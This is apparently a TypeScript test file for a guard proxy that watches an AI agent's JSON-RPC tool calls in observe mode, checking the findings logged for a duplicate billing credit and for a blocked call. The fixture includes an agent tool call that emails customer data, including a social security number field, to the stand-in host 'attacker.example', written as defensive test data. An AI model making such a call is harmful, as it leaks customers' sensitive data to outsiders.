import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";

import { handleJsonRpc } from "../src/proxy.js";
import type { AdapterConfig, JsonRpcRequest, ObservationDecisionLog } from "../src/types.js";

const base = JSON.parse(
  await readFile(new URL("./local-guard-config.json", import.meta.url), "utf8"),
) as AdapterConfig;
const config: AdapterConfig = { ...base, mode: "observe" };
const logs: ObservationDecisionLog[] = [];
let forwardedCalls = 0;

await call(issueCredit());
await call(issueCredit());
await call(piiEmail());

assert.equal(forwardedCalls, 3);
assert.deepEqual(
  logs.map((entry) => ({
    tool: entry.tool,
    counterfactual_decision: entry.counterfactual_decision,
    findings: entry.findings,
    gateway_outcome: entry.gateway_outcome,
  })),
  [
    {
      tool: "provider.billing.issue_credit",
      counterfactual_decision: "allow",
      findings: [],
      gateway_outcome: "forwarded",
    },
    {
      tool: "provider.billing.issue_credit",
      counterfactual_decision: "deny",
      findings: ["idempotencyKey was already used"],
      gateway_outcome: "forwarded",
    },
    {
      tool: "provider.email.send_external",
      counterfactual_decision: "deny",
      findings: [
        "externalDomain is not allowed: attacker.example",
        "field is blocked: ssn",
        "externalDomain is not allowed for flow: attacker.example",
        "field is blocked by flow: ssn",
      ],
      gateway_outcome: "forwarded",
    },
  ],
);

console.log(JSON.stringify({ mode: "observe", forwarded_calls: forwardedCalls, observations: logs }, null, 2));

async function call(request: JsonRpcRequest): Promise<void> {
  await handleJsonRpc(
    request,
    config,
    { logger: (entry) => logs.push(entry as ObservationDecisionLog) },
    async (_url, init) => {
      const forwarded = JSON.parse(String(init?.body)) as JsonRpcRequest;
      assert.deepEqual(forwarded, request);
      assert.equal(JSON.stringify(forwarded).includes("_agentid_receipt"), false);
      forwardedCalls += 1;
      return jsonResponse({ jsonrpc: "2.0", id: request.id, result: { content: [] } });
    },
  );
}

function issueCredit(): JsonRpcRequest {
  return {
    jsonrpc: "2.0",
    id: "credit-1",
    method: "tools/call",
    params: {
      name: "provider.billing.issue_credit",
      arguments: {
        customer_id: "cus_123",
        job_id: "support_case_resolution",
        amount_usd: 75,
        approval_id: "approval-456",
        idempotency_key: "credit-case-1042-cus_123",
      },
    },
  };
}

function piiEmail(): JsonRpcRequest {
  return {
    jsonrpc: "2.0",
    id: "pii-email",
    method: "tools/call",
    params: {
      name: "provider.email.send_external",
      arguments: {
        customer_id: "cus_123",
        job_id: "support_case_resolution",
        domain: "attacker.example",
        fields: ["customer_id", "ssn"],
        approval_id: "approval-789",
      },
    },
  };
}

function jsonResponse(body: unknown): Response {
  return new Response(JSON.stringify(body), {
    status: 200,
    headers: { "content-type": "application/json" },
  });
}
